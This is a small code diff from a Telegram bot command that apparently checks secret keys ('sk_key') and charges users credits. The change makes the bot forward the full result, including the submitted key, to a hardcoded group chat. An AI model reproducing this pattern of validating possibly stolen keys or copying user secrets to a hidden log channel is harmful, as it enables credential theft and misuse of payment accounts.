@@ -53,10 +53,10 @@ async def sk(Client, message):
 <b>KEY:</b> <code>{sk_key}</code>
 <b>RESPONSE:</b> <code>{response}</code>
 
-<b>ᗚ</b> CREDITS LEFT: {credits_left} Credits
+<b>ᗚ</b> CREDITS LEFT:</b> <code>{credits_left} Credits </code>
 <b>♻️</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
         msg = await msg.edit(text) 
-        await Client.send_message(-1001513565895, lasttext)
+        await Client.send_message(-1001513565895, text)
   except Exception as e:
     await Client.send_message(chat_id=loggp, text=e)      
